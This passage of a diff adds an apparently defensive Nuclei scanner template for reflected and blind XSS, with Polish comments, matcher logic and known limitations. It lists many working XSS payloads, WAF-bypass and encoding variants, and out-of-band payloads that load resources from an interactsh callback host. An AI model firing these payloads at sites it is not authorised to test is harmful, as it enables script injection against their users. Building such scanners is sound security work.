+        - "<svg onseeked={{canary}}>"
+        - "<svg onseeking={{canary}}>"
+        - "<svg onselect={{canary}}>"
+        - "<svg onselectstart={{canary}}>"
+        - "<svg onstalled={{canary}}>"
+        - "<svg onsubmit={{canary}}>"
+        - "<svg onsuspend={{canary}}>"
+        - "<svg ontimeupdate={{canary}}>"
+        - "<svg ontoggle={{canary}}>"
+        - "<svg ontouchcancel={{canary}}>"
+        - "<svg ontouchend={{canary}}>"
+        - "<svg ontouchmove={{canary}}>"
+        - "<svg ontouchstart={{canary}}>"
+        - "<svg ontransitioncancel={{canary}}>"
+        - "<svg ontransitionend={{canary}}>"
+        - "<svg ontransitionrun={{canary}}>"
+        - "<svg ontransitionstart={{canary}}>"
+        - "<svg onvolumechange={{canary}}>"
+        - "<svg onwaiting={{canary}}>"
+        - "<svg onwebkitanimationend={{canary}}>"
+        - "<svg onwebkitanimationiteration={{canary}}>"
+        - "<svg onwebkitanimationstart={{canary}}>"
+        - "<svg onwebkittransitionend={{canary}}>"
+        - "<svg onwheel={{canary}}>"
+
+        # ====================================================================
+        # GROUP 20: PortSwigger no-parens / no-quotes / no-semicolons
+        # Source: seclists/Fuzzing/XSS/human-friendly/xss-without-parentheses-semi-colons-portswigger.txt
+        # Krytyczne dla bypass filtrów blokujących `(` lub `;` lub `'`/`"`
+        # ====================================================================
+        - "<script>{{canary}}`{{canary}}`</script>"                    # tagged template
+        - "<script>onerror={{canary}};throw 1</script>"                # throw-eval pattern
+        - "<script>{onerror={{canary}}}throw 1</script>"
+        - "<script>throw onerror={{canary}},'XSS'</script>"
+        - "<svg><script>123<a>{{canary}}()</script>"                   # SVG script no /
+        - "<script>document.body.innerHTML={{canary}}</script>"
+        - "<script>location={{canary}}</script>"
+        - "<script>Function`{{canary}}`</script>"
+        - "<script>setTimeout`{{canary}}\\x60`</script>"
+        - "<script>setImmediate`{{canary}}\\x60`</script>"
+        - "<script>(({{canary}}=alert))(1)</script>"
+        - "<script>{{canary}}.call`1`</script>"
+
+        # ====================================================================
+        # GROUP 21: HTML5 advanced - object/embed/xlink/xsl
+        # Source: seclists/Fuzzing/HTML5sec-Injections-Jhaddix.txt (lines 50-180)
+        # ====================================================================
+        - "<object data=\"data:text/html;base64,PHNjcmlwdD57e2NhbmFyeX19PC9zY3JpcHQ+\"></object>"
+        - "<embed src=\"data:text/html;base64,PHNjcmlwdD57e2NhbmFyeX19PC9zY3JpcHQ+\"></embed>"
+        - "<embed src=\"javascript:{{canary}}()\"></embed>"
+        - "<image src=\"javascript:{{canary}}()\">"
+        - "<svg xmlns=\"http://www.w3.org/2000/svg\"><a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:{{canary}}()\"><rect width=\"1000\" height=\"1000\" fill=\"white\"/></a></svg>"
+        - "<svg><animation xlink:href=\"javascript:{{canary}}()\"/></svg>"
+        - "<svg><foreignObject xlink:href=\"javascript:{{canary}}()\"/></svg>"
+        - "<svg><set attributeName=\"onmouseover\" to=\"{{canary}}()\"/></svg>"
+        - "<svg><animate attributeName=\"onunload\" to=\"{{canary}}()\"/></svg>"
+        - "<form><button formaction=\"javascript:{{canary}}()\">X</button></form>"
+        - "<event-source src=\"data:,\" onload=\"{{canary}}()\">"
+        - "<div style=\"width:1px;filter:glow\" onfilterchange=\"{{canary}}()\">x</div>"
+        - "<x xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\" ev:handler=\"javascript:{{canary}}()//#x\"/>"
+        - "<doc xmlns:xlink=\"http://www.w3.org/1999/xlink\"><x xlink:href=\"javascript:{{canary}}()\" xlink:type=\"simple\">XXX</x></doc>"
+
+        # ====================================================================
+        # GROUP 22: Backtick / template literal contexts (advanced JS)
+        # Wykrywa odbicie wewnątrz `template ${...}` literals
+        # ====================================================================
+        - "`+{{canary}}()+`"
+        - "`-{{canary}}()-`"
+        - "${${{ '{' }}{{canary}}{{ '}' }}}"
+        - "}+({{canary}}())+`"
+        - "${alert({{canary}})}"
+        - "`;{{canary}}();`"
+
+        # ====================================================================
+        # GROUP 23: Attribute breakout w atrybutach które pozwalają na quote
+        # Reguła kombinatoryczna: 4 typy quote × 3 typy breakout
+        # ====================================================================
+        - "\" autofocus onfocus={{canary}}() x=\""
+        - "' autofocus onfocus={{canary}}() x='"
+        - " autofocus onfocus={{canary}}() x="                          # bez quotes
+        - "` autofocus onfocus={{canary}}() x=`"
+        - "\"><svg onload={{canary}}>"
+        - "'><svg onload={{canary}}>"
+        - "\"></script><svg onload={{canary}}>"
+        - "\" onmouseover={{canary}}() \""
+        - "' onmouseover={{canary}}() '"
+        - "\"+{{canary}}+\""                                              # JS string concat
+        - "'+{{canary}}+'"
+
+        # ====================================================================
+        # GROUP 24: Encoding combinatorics - extended
+        # 5 base payloadów × 5 wariantów encoding
+        # ====================================================================
+        # Mixed URL+entity
+        - "%3Cscr&#105;pt%3E{{canary}}%3C/scr&#105;pt%3E"
+        - "&#x3c;svg/onload={{canary}}&#x3e;"
+        - "&#60;img&#32;src=x&#32;onerror={{canary}}&#62;"
+        # UTF-7 (legacy IE)
+        - "+ADw-script+AD4-{{canary}}+ADw-/script+AD4-"
+        # UTF-16 BOM
+        - "\\ufeff<script>{{canary}}</script>"
+        # Backslash-escape chains in JS
+        - "<script>\\u003calert\\u003e({{canary}})</script>"
+        - "<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;({{canary}})>"
+        # Decimal entity in attribute (no semicolon required in some parsers)
+        - "<svg/onload=&#97&#108&#101&#114&#116({{canary}})>"
+
+        # ====================================================================
+        # GROUP 25: BRUTELOGIC Bypass-Strings (curated WAF bypass)
+        # Source: seclists/Fuzzing/XSS/human-friendly/XSS-Bypass-Strings-BruteLogic.txt
+        # ====================================================================
+        - "<svg/onload=&#x6a;avascript:{{canary}}()>"
+        - "<svg/onload=eval(name)>"                                     # window.name technique
+        - "<a href=\"j&Tab;avascript:{{canary}}()\">X</a>"              # tab entity in scheme
+        - "<a href=\"j&NewLine;avascript:{{canary}}()\">X</a>"
+        - "<a href=\"&#11;javascript:{{canary}}()\">X</a>"              # vertical tab
+        - "<svg><script>{{canary}}/*&#x2a;/{{canary}}*/</script>"
+        - "<svg><script>{{canary}}//&#x0a;//</script>"
+        - "<a href=\"\\u0001javascript:{{canary}}()\">X</a>"
+        - "<details/open/ontoggle={{canary}}()>"
+        - "<details/open ontoggle={{canary}}()>"
+        - "<svg><script href=data:,{{canary}}() />"
+        - "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSkgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48L3N2Zz4=\"/></svg>"
+
+      # ========================================================================
+      # OOB payloads (włączane przez `-tags oob` we wrapperze)
+      # Wymaga interactsh-server (domyślnie ProjectDiscovery public).
+      # Tag `oob` na poziomie szablonu pozwala selektywnie włączać.
+      # ========================================================================
+      xss_oob:
+        - "<img src=//{{interactsh-url}}/{{canary}}>"
+        - "<script src=//{{interactsh-url}}/{{canary}}.js></script>"
+        - "<link rel=stylesheet href=//{{interactsh-url}}/{{canary}}.css>"
+        - "<iframe src=//{{interactsh-url}}/{{canary}}></iframe>"
+
+    # ========================================================================
+    # Fuzzing config: wszystkie 5 części żądania w trybie single (jeden parametr
+    # na raz - dokładniej, ale więcej requestów). URL-encoding wartości żeby
+    # niezniszczyć struktury żądania.
+    # ========================================================================
+    fuzzing:
+      - parts:
+          - query
+          - body
+          - cookie
+          - path
+          - header
+        type: postfix      # postfix = doklej do oryginalnej wartości (zachowuje shape)
+        mode: single       # single = jeden parametr na raz (mniej noise)
+        # Filtr keys: nie fuzzujemy headerów typowych dla auth/CSRF/cache
+        # bo to: (1) niszczy auth, (2) cache headery zwykle nie są reflected
+        fuzz:
+          - "{{url_encode(xss)}}"
+
+    stop-at-first-match: true
+
+    # ========================================================================
+    # Matchery 3-warstwowe:
+    # 1) PRIMARY: kanarek odbity w niebezpiecznym kontekście (regex z literal `<`,
+    #    `javascript:`, event-handler, attr breakout). Sam fakt wystąpienia
+    #    canary w body to za mało - musi być w niebezpiecznym kontekście.
+    # 2) SECONDARY: Content-Type wskazuje renderowalny format (text/html, svg).
+    #    JSON odpowiedzi które odbijają canary nie egzekwują XSS w przeglądarce
+    #    (chyba że MIME sniffing - poza skalą).
+    # 3) ANTI-FP: nie WAF-block (403 z keyword "blocked"), nie escape'd canary,
+    #    nie status 5xx z generycznym error page.
+    # ========================================================================
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: Primary signal - kanarek w niebezpiecznym kontekście HTML/JS
+      # Wzorce: canary w opening tag / event handler / javascript: URI / inside <script>
+      - type: regex
+        part: body
+        name: dangerous-reflection
+        regex:
+          # canary jako fragment opening tag <CANARY>, <foo CANARY=>, <foo bar=CANARY
+          - "<[^>\\s]*{{canary}}"
+          - "<[^>]+\\s+[^=>\\s]*{{canary}}"
+          # canary w atrybucie event handler on*=
+          - "(?i)on\\w+\\s*=\\s*[\"']?[^\"']*{{canary}}"
+          # canary w javascript: / data: URI w atrybucie href/src/action
+          - "(?i)(href|src|action|formaction|data|poster|background)\\s*=\\s*[\"']?(javascript|data|vbscript)[^\"'>]*{{canary}}"
+          # canary wewnątrz <script>...{{canary}}...</script> jako string
+          - "(?is)<script[^>]*>[^<]*{{canary}}"
+          # canary w style/expression
+          - "(?i)style\\s*=\\s*[\"'][^\"']*expression\\([^)]*{{canary}}"
+        condition: or
+
+      # Warstwa 2: Secondary - Content-Type renderable LUB JSON (SPA reflection)
+      # JSON odpowiedzi z odbiciem canary w niebezpiecznym kontekście to nadal
+      # sygnał — może być wykorzystane przez frontend który renderuje JSON jako HTML
+      # (typowe w SPA). Wykluczamy tylko czyste binarne typy.
+      - type: regex
+        part: header
+        name: renderable-or-json
+        regex:
+          - "(?i)content-type:\\s*(text/html|image/svg|application/xhtml|application/json|text/json|text/plain|application/javascript|text/javascript)"
+
+      # Warstwa 3a: Anti-FP - escape detection
+      # Jeśli body zawiera ESCAPE'd kanarek (&lt;CANARY) i NIE zawiera surowego,
+      # to jest properly sanitized - negative match.
+      # UWAGA: tu sprawdzamy czy NIE występuje wzorzec w pełni-escape'd. Jeśli
+      # występuje też surowy (warstwa 1) to mamy match. Ale gdy TYLKO escape'd
+      # to warstwa 1 nie złapie więc to redundantne. Zostawiam dla pewności.
+      - type: regex
+        part: body
+        name: not-fully-escaped
+        negative: true
+        regex:
+          # Same escape'd warianty - blokujemy jeśli to JEDYNA forma
+          # (warstwa 1 gwarantuje że surowy też wystąpił - gdyby nie, ten check by FP'd)
+          # więc sprawdzamy czy nie ma keyword'ów sanityzatora typu "[FILTERED]"
+          - "(?i)(\\[filtered\\]|<sanitized>|removed by waf|blocked by security)\\s*{{canary}}"
+
+      # Warstwa 3b: Anti-FP - WAF block detection
+      # Status 403 + body z markerami WAF = block, nie odbicie
+      - type: dsl
+        name: not-waf-block
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked") && !contains(tolower(body), "forbidden"))'
+
+      # Warstwa 3c: Anti-FP - Timeout protection
+      - type: dsl
+        name: response-time-sane
+        dsl:
+          - "duration < 30"
+
+      # Warstwa 3d: Anti-FP - CSRF rejection detection (negative)
+      # Jeśli odpowiedź to typowy CSRF error, nie traktuj jako XSS
+      - type: regex
+        part: body
+        name: not-csrf-rejection
+        negative: true
+        regex:
+          - "(?i)(invalid csrf token|csrf token mismatch|x-csrf-token.*invalid|forbidden.*csrf)"
+
+      # Warstwa 3e: Anti-FP - Auth rejection (401 z auth-related keywordami)
+      - type: dsl
+        name: not-auth-rejection
+        dsl:
+          - 'status_code != 401'
+
+    # ========================================================================
+    # Extractors: dla raportu deweloperzy chcą widzieć dokładny kontekst odbicia
+    # ========================================================================
+    extractors:
+      - type: regex
+        name: reflected-context
+        part: body
+        group: 0
+        regex:
+          - ".{0,80}{{canary}}.{0,80}"
+
+      - type: dsl
+        name: detected-context
+        dsl:
+          - "regex(\"<[^>]*\" + canary, body) ? \"html-tag\" : \"\""
+          - "regex(\"on\\\\w+\\\\s*=[^>]*\" + canary, body) ? \"event-handler\" : \"\""
+          - "regex(\"javascript:[^>]*\" + canary, body) ? \"js-uri\" : \"\""
+          - "regex(\"<script[^>]*>[^<]*\" + canary, body) ? \"js-string\" : \"\""
+
+  # ==========================================================================
+  # DRUGI BLOCK: Blind XSS via OAST resource-load detection
+  # Wykrywa scenariusze gdy payload ładuje zewnętrzny zasób (img/script/iframe
+  # src=//interactsh) - jeśli payload zostanie wyrenderowany w przeglądarce
+  # ofiary lub serwer doda go do template renderowanego po stronie klienta,
+  # zasób zostanie pobrany. Callback do interactsh = evidence wykonania.
+  # ==========================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate|logout|signout)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      xss_oob:
+        - "<img src=//{{interactsh-url}}/{{canary}}>"
+        - "<script src=//{{interactsh-url}}/{{canary}}.js></script>"
+        - "<link rel=stylesheet href=//{{interactsh-url}}/{{canary}}.css>"
+        - "<iframe src=//{{interactsh-url}}/{{canary}}></iframe>"
+        - "<video><source src=//{{interactsh-url}}/{{canary}}.mp4></video>"
+        - "<audio src=//{{interactsh-url}}/{{canary}}.mp3></audio>"
+        - "<object data=//{{interactsh-url}}/{{canary}}></object>"
+        - "<embed src=//{{interactsh-url}}/{{canary}}>"
+        - "<svg><image href=//{{interactsh-url}}/{{canary}}/></svg>"
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{url_encode(xss_oob)}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-callback-received
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+# ============================================================================
+# Known limitations:
+# - Nie wykrywa DOM-based XSS (wymaga headless browsera)
+# - Nie wykrywa Stored XSS (POST → GET mapping wymaga ręcznej konfiguracji)
+# - Nie wykrywa mXSS (mutation w DOM)
+# - W mode `single` parametry path mogą nie być dobrze fuzzowane jeśli endpoint
+#   ma <2 segmenty (Nuclei skipuje root path)
+# - Auth override przez -V auth_token wymaga że scripts/run-wstg-inpv-suite.sh
+#   doda -H "Authorization: $auth_token" - czysty YAML nie nadpisze headera
+#   warunkowo bez utraty oryginału
+# ============================================================================
